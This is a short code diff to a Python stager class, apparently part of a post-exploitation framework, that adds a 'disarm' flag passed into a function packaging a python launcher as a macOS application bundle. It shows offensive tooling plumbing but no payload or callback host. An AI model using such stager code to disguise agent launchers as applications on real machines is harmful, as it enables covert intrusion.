@@ -88,7 +88,7 @@ class Stager:
             return ""
 
         else:
-
+            disarm = False
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
-            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName)
+            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName,Disarm=disarm)
             return ApplicationZip
